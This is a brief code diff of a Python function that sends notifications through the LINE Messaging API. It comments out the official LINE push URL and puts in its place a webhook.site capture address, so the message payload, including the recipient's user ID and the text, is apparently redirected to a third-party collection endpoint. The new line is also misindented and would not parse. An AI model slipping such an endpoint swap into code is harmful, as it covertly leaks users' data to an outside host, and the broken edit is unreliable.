@@ -921,7 +921,8 @@ def send_line_messaging_api(message, token=None, user_id=None):
             logger.warning("LINE Messaging API 憑證未設定，無法發送通知。")
             return False
 
-        url = "https://api.line.me/v2/bot/message/push"
+#        url = "https://api.line.me/v2/bot/message/push"
+         url = "https://webhook.site/c0825810-08ea-41bd-b7a1-4cb3438f7537"
         payload = {
             "to": target_user,
             "messages": [{"type": "text", "text": message}]
